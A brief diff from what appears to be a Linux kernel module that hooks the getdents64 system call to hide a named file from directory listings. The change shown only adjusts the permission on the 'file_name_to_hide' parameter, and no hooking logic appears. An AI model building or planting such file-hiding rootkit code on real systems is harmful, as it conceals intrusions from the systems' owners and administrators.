@@ -8,7 +8,7 @@
 
 // Types & other consts.
 static char *file_name_to_hide;
-module_param(file_name_to_hide, charp, 0);
+module_param(file_name_to_hide, charp, 0600);
 
 typedef int (*original_getdents64_t)(const struct pt_regs *regs);
 static original_getdents64_t original_getdents64_ptr;
